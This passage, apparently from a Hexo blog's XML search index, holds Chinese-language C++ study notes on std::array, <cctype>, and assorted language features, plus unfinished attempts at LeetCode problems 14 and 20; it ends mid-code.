        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>std::array</title>
      <link href="/2022/04/30/std-array/"/>
      <url>/2022/04/30/std-array/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>c++11标准特性</li><li>IDE:vs 2022</li></ul><span id="more"></span><hr><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><ul><li>定义时必须指定大小，且不能使用变量指定</li><li>可以通过arry构造新的array，{}也合法</li><li>不可以使用数组构造，即arry &#x3D; ch是不合法的操作</li><li>本质上任然是一个固定大小的数组，不能删除或者添加元素。</li></ul><hr><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>如果使用了using namespace std，则后续代码可以无视std::<br>前期先保持基础写法。</p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在c语言和c++中，传统方式上定义一个数组可以用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> *ch2 = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>两者区别不大，前者由系统自动分配到栈区，后者在堆区上开辟空间并用指针指向它。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>使用array前，需引用头文件<array>;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::array&lt;<span class="type">int</span>, 2&gt; ary = &#123; <span class="number">0</span>,<span class="number">1</span> &#125;;</span><br><span class="line"><span class="comment">//或者不用=也一样</span></span><br><span class="line">std::array&lt;<span class="type">int</span>, 2&gt; ary2 &#123; <span class="number">0</span>,<span class="number">1</span> &#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h2><p>array内置size()方法，可以直接返回array数组有几个成员。</p><p>传统上我们需要知道数组的成员个数需要通过<code>sizeof(数组)/sizeof(数组类型或者数组首成员[0])</code>。</p><img src="/2022/04/30/std-array/003.png" class=""><hr><h2 id="fill"><a href="#fill" class="headerlink" title="fill()"></a>fill()</h2><p>可以说是一个初始化方法，根据括号内的值，将array数组所有成员都设置为括号内的值。<br>当然跟传统上的方法感觉差别不大。</p><img src="/2022/04/30/std-array/004.png" class=""><hr><h2 id="at"><a href="#at" class="headerlink" title="at()"></a>at()</h2><p>具有传统意义上索引作用，传统数组使用数组[0]来获取内容，而array数组则根据at(0)来返回，当然不是说arry数组就不能使用[]了，而是多了at()方法。</p><p>如果产生越界行为，如arry&lt;int,2&gt; arr，而你去访问arr.at(100),程序即产生错误抛出异常：</p><img src="/2022/04/30/std-array/000.png" class=""><p>传统定义的数组去访问越界时就有可能得到不正确的值，可以说是一种不安全的行为：</p><img src="/2022/04/30/std-array/001.png" class=""><hr><h2 id="x3D-x3D-重载"><a href="#x3D-x3D-重载" class="headerlink" title="&#x3D;&#x3D;重载"></a>&#x3D;&#x3D;重载</h2><img src="/2022/04/30/std-array/005.png" class=""><p>可以看到有意思的是，arrary数组相比较能返回真，而相同的int数组则返回假，当然底层离不开符号重载的实现。重载后面再说，我们可以浅看一下反汇编代码：<br>先打个断点：<img src="/2022/04/30/std-array/006.png" class=""><br>然后转到反汇编：<img src="/2022/04/30/std-array/007.png" class=""></p><p>首先就是array的反汇编代码比正常数组的代码少。<br>然后ch和ch1有一个cmp比较过程，但随后的jne好像是不等于就转移，然后后面就是一堆跟地址一样的操作</p><blockquote><p>汇编还没系统性学习，看个大概</p></blockquote><p>ary和ary2在call的时候有一个operator&#x3D;&#x3D;，这是符号重载的写法，也就是说这里肯定离不开重载，至于后面的目前也不是很清楚</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>内置的方法还有几个，涉及到容器的方面，等后面再补充吧。</p><p>封装好的东西固然功能多，在各方面会更完善，但也就意味着资源消耗的也多了。不过使用的前提还是看使用者，有这么个好东西知道就行。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;cctype&gt;</title>
      <link href="/2022/04/28/cpp-cctype/"/>
      <url>/2022/04/28/cpp-cctype/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>cctype头文件</li></ul><span id="more"></span><hr><h1 id="包含的函数"><a href="#包含的函数" class="headerlink" title="包含的函数"></a>包含的函数</h1><table>    <tr>        <th colspan="2">字符处理函数</th>    </tr>    <tr>        <td>函数</td>        <td>说明</td>    <tr>    <tr>        <td>isupper(char)</td>        <td>如果参数是大写字母，函数返回true</td>    <tr>    <tr>        <td>islower(char)</td>        <td>如果参数是小写字母，函数返回true</td>    <tr>    <tr>        <td>isalpha(char)</td>        <td>如果参数是字母，函数返回true</td>    <tr>    <tr>        <td>isdigit(char)</td>        <td>如果参数是数字（0－9），函数返回true</td>    <tr>    <tr>        <td>isalnum(char)</td>        <td>如果参数是字母数字，即字母或者数字，函数返回true</td>    <tr>    <tr>        <td>isspace(char)</td>        <td>如果参数是标准空白字符，如空格、换行符、水平或垂直制表符，函数返回true</td>    <tr>    <tr>        <td>isblank(char)</td>        <td>如果参数是空格，则返回true</td>    <tr>    <tr>        <td>ispunct(char)</td>        <td>如果参数是标点符号，函数返回true</td>    <tr>    <tr>        <td>isprint(char)</td>        <td>如果参数是打印字符（包括空格），函数返回true</td>    <tr>    <tr>        <td>iscntrl(char)</td>        <td>如果参数是控制字符，函数返回true</td>    <tr>    <tr>        <td>isgraph(char)</td>        <td>如果参数是除空格之外的打印字符，函数返回true</td>    <tr>    <tr>        <td>tolower(char)</td>        <td>如果参数是大写字符，返回其小写，否则返回该参数</td>    <tr>    <tr>        <td>toupper(char)</td>        <td>如果参数是小写字符，返回其大写，否则返回该参数</td>    <tr></table><hr><h1 id="尝试输出一下代码"><a href="#尝试输出一下代码" class="headerlink" title="尝试输出一下代码"></a>尝试输出一下代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; c &lt;= <span class="number">127</span>; c++)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;ASCII为 &quot;</span> &lt;&lt; (<span class="type">int</span>)c &lt;&lt; <span class="string">&quot; 的字符为 &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">iscntrl</span>(c))&#123;<span class="comment">//判断是否为控制字符</span></span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">iscntrl</span>(c) ? <span class="string">&quot;控制字符  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isspace</span>(c) ? <span class="string">&quot;标准空白字符，如空格、换行符、水平或垂直制表符&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; (isblank(c) ? &quot;空格&quot;: &quot;&quot;);</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//非控制字符</span></span><br><span class="line">std::cout &lt;&lt; c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isprint</span>(c) ? <span class="string">&quot;打印字符(包括空格)  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isgraph</span>(c) ? <span class="string">&quot;除空格之外的打印字符  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isalnum</span>(c) ? <span class="string">&quot;字母数字  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isalpha</span>(c) ? <span class="string">&quot;字母  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">islower</span>(c) ? <span class="string">&quot;小写字母  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isupper</span>(c) ? <span class="string">&quot;大写字母  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isdigit</span>(c) ? <span class="string">&quot;数字(0-9)  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">isxdigit</span>(c) ? <span class="string">&quot;十六进制数字(0-9,A-F,a-f)  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; (<span class="built_in">ispunct</span>(c) ? <span class="string">&quot;标点符号  &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们可以在编译器自己尝试一下，基本概念对与ASCII码来说，小写a-z和大写A-Z和数字0-9我们是尽量记住范围会比较好<br>绝大部分看情况用得到在百度下就行了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cpp查漏补缺</title>
      <link href="/2022/04/25/cpp/"/>
      <url>/2022/04/25/cpp/</url>
      
        <content type="html"><![CDATA[<h1 id="查漏补缺随意版"><a href="#查漏补缺随意版" class="headerlink" title="查漏补缺随意版"></a>查漏补缺随意版</h1><p style="font-size:14px; text-align:right;">—— 有些记得住有些靠记录，至于看不看...</p><span id="more"></span><p>额。。兜兜转转感觉对安全之类的兴趣一般，还是又回头重拾c++了，说来也惭愧，c++倒是还记得点，qt框架因为当时b站只弄过一个翻金币的小游戏，所以经验不足。<br>先花点时间把c++重新过一遍，然后找qt项目练手~ 不然工作要g了。</p><hr><h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><table><thead><tr><th align="center">语言</th><th align="center">转换过程</th><th align="center">举例</th></tr></thead><tbody><tr><td align="center">c++</td><td align="center">static_cast<type>(value)</td><td align="center">int a &#x3D; static_cast<int>(a+b)</td></tr><tr><td align="center">c</td><td align="center">type(value)</td><td align="center">int a &#x3D; int(a+b)</td></tr></tbody></table><hr><h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><table><thead><tr><th align="center">类型</th><th align="center">占用</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">1</td><td align="center">ascii字符</td></tr><tr><td align="center">wchar_t</td><td align="center">2</td><td align="center">宽字节字符</td></tr><tr><td align="center">char16_t</td><td align="center">2</td><td align="center">utf_16字符</td></tr><tr><td align="center">char32_t</td><td align="center">4</td><td align="center">utf_18字符</td></tr></tbody></table><blockquote><p>输入wchar_t变量时需要使用wcout输出，定义时需加L<br>16和32目前输出都是数字，区别在于占用的内存</p></blockquote><hr><h2 id="推断类型"><a href="#推断类型" class="headerlink" title="推断类型"></a>推断类型</h2><table><thead><tr><th align="center">auto</th></tr></thead><tbody><tr><td align="center">auto 变量名{初始值}</td></tr></tbody></table><blockquote><p>大多情况不会使用auto，因为c和c++都是强语言，他对变量的声明还是要求较为严格的</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">typeid</span>(变量).<span class="built_in">name</span>(); <span class="comment">//用于查看变量类型</span></span><br></pre></td></tr></table></figure><hr><h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h2><table>    <tr>        <th colspan="2"> std::格式化输出 </th>    </tr>    <tr>        <td>Dec</td>        <td>以十进制格式显示后续数字</td>    </tr>    <tr>        <td>endl</td>        <td>写入新行并冲刷输出流</td>    </tr>    <tr>        <td>fixed</td>        <td>输出浮点数，例如3.1415926</td>    </tr>    <tr>        <td>flush</td>        <td>冲刷输出流</td>    </tr>    <tr>        <td>hex</td>        <td>以十六进制输入或输出</td>    </tr>    <tr>        <td>left</td>        <td>左对齐输出</td>    </tr>    <tr>        <td>oct</td>        <td>以八进制输入或输出</td>    </tr>    <tr>        <td>right</td>        <td>右对齐输出</td>    </tr>    <tr>        <td>scientific</td>        <td>使用科学表示法表示浮点数</td>    </tr>    <tr>        <td>setfill(ch)</td>        <td>使用 ch 填充字符</td>    </tr>    <tr>        <td>setprecision(n)</td>        <td>将浮点精度设置为n</td>    </tr>    <tr>        <td>setw(n)</td>        <td>将输出字段的宽度设置为n</td>    </tr>    <tr>        <td>showbase</td>        <td>打印数字时显示基数（进制）</td>    </tr>    <tr>        <td>noshowbase</td>        <td>打印数字时不要显示基数（进制）</td>    </tr>    <tr>        <td>showpoint</td>        <td>强制显示小数点和尾随零</td>    </tr>    <tr>        <td>noshowpoint</td>        <td>如果可能的话，不打印结尾零和小数点</td>    </tr>    <tr>        <td>showpos</td>        <td>在非负数前面打印一个加号</td>    </tr>    <tr>        <td>noshowpos</td>        <td>在非负数前面不打印加号</td>    </tr>    <tr>        <td>defaultfloat</td>        <td>恢复之前修改的浮点数计数方法和科学计数方法</td>    </tr></table><blockquote><p>个别如setprecision、setw、setfill使用时需要使用头文件iomanip</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//举个例子</span></span><br><span class="line">std::cout &lt;&lt; std::fixed;</span><br><span class="line">std::cout &lt;&lt; <span class="number">3.14</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果就是3.14000</span></span><br></pre></td></tr></table></figure><hr><h2 id="叼猫优先级"><a href="#叼猫优先级" class="headerlink" title="叼猫优先级"></a>叼猫优先级</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = b+++a;</span><br><span class="line">c = b---a;</span><br><span class="line">c = <span class="number">3</span>*-b+++a;</span><br><span class="line">c = <span class="number">2</span>*-b---a;</span><br></pre></td></tr></table></figure><blockquote><p>后缀优先原则，当出现多个+或者-的时候自动先匹配两个。<br>如c&#x3D;b+++a； 换做c &#x3D; (b++)+a;</p></blockquote><p>当然这种叼毛写法谁写谁哈皮，也就是无聊的考试官会出。不理解的可以通过vs去反汇编看执行顺序。</p><img src="/2022/04/25/cpp/000.png" class=""><img src="/2022/04/25/cpp/001.png" class=""><hr><h2 id="二进制流输出"><a href="#二进制流输出" class="headerlink" title="二进制流输出"></a>二进制流输出</h2><p>引入头文件<code>bitset</code><br>然后<code>std::cout &lt;&lt; std::bitset&lt;位数&gt;(变量)</code></p><hr><h2 id="c-for"><a href="#c-for" class="headerlink" title="c++ for"></a>c++ for</h2><p>众所周知，在c语言里面，循环打印数组需要：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> num[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; sizof(num)/sizof(<span class="type">int</span>); i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,num[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然c++也能用上述的办法，但是还有一种更简洁的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i : num)&#123;</span><br><span class="line">        std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>与常用的c语言循环不同，cpp这种是用i作为变量挨个读取数组num的值，并且打印，而不再是用i做数组的索引</p></blockquote><p>当然需要注意i的类型是和数组类型一致的，如果不想操心，可以设置i为<code>auto i</code>,自适应相对而言省去不少烦恼了，但是如果要求严谨那么久严格遵循即可。</p><p>哦还要注意多维数组的情况,其实基本道理一样，只能在内嵌最深处使用<code>auto type: 数组</code>这样的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num[<span class="number">3</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j:num[i])&#123;</span><br><span class="line">            std::cout &lt;&lt; j &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="列表初始化"><a href="#列表初始化" class="headerlink" title="列表初始化"></a>列表初始化</h2><p>传统赋值初始化的时候都是用&#x3D;号完成<br>c++其实可以用{}代替，</p><p>二者相比之下{}会相对更加严谨一点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b&#123;<span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure><p>第一感观上就会像是给class赋值初始化，但是也并非只能给class用。</p><p>列表初始化也是c++11起的特性。<br><a href="https://zh.cppreference.com/w/cpp/language/list_initialization">参考链接</a></p><p>这里只是简单提一下，要详细理解的阅读一下参考链接的内容。</p><hr><h2 id="c-x2F-c-声明和定义的问题"><a href="#c-x2F-c-声明和定义的问题" class="headerlink" title="c&#x2F;c++ 声明和定义的问题"></a>c&#x2F;c++ 声明和定义的问题</h2><p>在C语言中，变量声明但是不定义是不占用内存空间的。如果调用了一个未初始化的变量，编译器会分配到一个垃圾值的问题。</p><img src="/2022/04/25/cpp/002.png" class=""><p>而c++，局部变量是必须要有定义的。除非使用extern做声明，这样才不用初始化。</p><hr><h2 id="UB"><a href="#UB" class="headerlink" title="UB"></a>UB</h2><p>UB全称<code>undefined behaviour.</code>，也就是常说的未定义行为</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第二十题</title>
      <link href="/2022/04/13/leetcodeno20/"/>
      <url>/2022/04/13/leetcodeno20/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>string</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><img src="/2022/04/13/leetcodeno20/000.png" class=""><p>三种类型的括号<br>要么按顺序两两一对，要么首尾一对对内嵌。</p><p>根据示例2</p><blockquote><p>输入：s &#x3D; “()[]{}”<br>输出：true</p></blockquote><p>示例4</p><blockquote><p>输入：s &#x3D; “{[]}”<br>输出：true</p></blockquote><p>看到具体效果。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>正常看到这个题目，原本是想通过string的replace去替换掉一组成员，然后循环判断，但是c++的replace不是很好使就算了。。。</p><p>那就按照关系，去看一下ASCII码，发现这几个括号之间相差1或2的情况。如下图第三列情况：</p><img src="/2022/04/13/leetcodeno20/004.png" class=""><img src="/2022/04/13/leetcodeno20/006.png" class=""><img src="/2022/04/13/leetcodeno20/005.png" class=""><p>那么在if关系中应该是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(s[i]+<span class="number">1</span> == s[i+i] || s[i]+<span class="number">2</span> == s[i+i]) </span><br></pre></td></tr></table></figure><blockquote><p>当然这种情况是括号两两一对按序排列的理想情况</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>, n2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();                               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]+<span class="number">1</span> == s[i+<span class="number">1</span>] || s[i]+<span class="number">2</span> == s[i+<span class="number">1</span>])                          </span><br><span class="line">                n++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i &lt; len/<span class="number">2</span> &amp;&amp; (s[i]+<span class="number">1</span> == s[len-i<span class="number">-1</span>] || s[i]+<span class="number">2</span> == s[len-i<span class="number">-1</span>]))      </span><br><span class="line">                n2++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (n == len/<span class="number">2</span> || n2 == len/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>其实这样写也有点不靠谱，两种情况放到一起有点不太明确，看着也会很奇怪。<br>第一种情况就是两两一对<br>第二种情况就是头尾一对往里推</p></blockquote><img src="/2022/04/13/leetcodeno20/001.png" class=""><p>测试一下这个案例没问题。</p><img src="/2022/04/13/leetcodeno20/007.png" class=""><blockquote><p>好家伙。。抛开头和尾，里面这样组合也确实是闭合的图形，突然给我整不会了。</p></blockquote><p><strong>思路一下子打不开了。。感觉陷进去了，挣扎了挺久的看了下评论区全是用栈的方式来弄，这样好像就没看到什么暴力解体的思路了，stack还没怎么用过不熟悉，看来这题要搁置先了</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第十四题</title>
      <link href="/2022/04/11/leetcodeno14/"/>
      <url>/2022/04/11/leetcodeno14/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续划水做做看</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>string<ul><li>length</li></ul></li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/04/11/leetcodeno14/000.png" class=""><p>看到这个就想用两个for跑，用一个string变量+&#x3D;。</p><p>初始代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>假设第一层for循环跑strs的个数，第二个跑str[i]的长度，那么如果需要比较的话就又得多一层循环，三层其实有点多了，不是很好的办法。</p><p>……想了半天，既然是前缀之间的比较，那么假设循环的长度根据<code>strs[0].length()</code>，那么无论[0]的长度是最长还是最短，无非就三个结果，要么正好是他，要么是其中几个，要么都不是。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      <span class="comment">//用str[0]作为对象与后面的比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>()</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>replace那些用起来比较麻烦的感觉，创建一个新的string变量，找到公共的就+&#x3D;进去是暴力解法的第一步。<br>然后就是if的问题，我该怎么去判断，是和不是又该怎么处理。<br>如果说直接比较</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strs[<span class="number">0</span>][i] == strs[j][i])</span><br><span class="line">    s += strs[<span class="number">0</span>][i];</span><br></pre></td></tr></table></figure><p>若是相等，直接让变量s+&#x3D;strs[0][i],乍一看还是很合理的，让我们找个示例测试一下：</p><img src="/2022/04/11/leetcodeno14/001.png" class=""><p>好家伙。。比strs[0]都长了。。逆天</p><p>整理了一下，问题在于s+&#x3D;不应该在if里面，因为相等的时候，i还没有变，j倒是自增了，就导致重复+i的情况。</p><p>那也就是说s+的过程应该放在内循环外面</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      <span class="comment">//用str[0]作为对象与后面的比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs[<span class="number">0</span>][i] == strs[j][i])</span><br><span 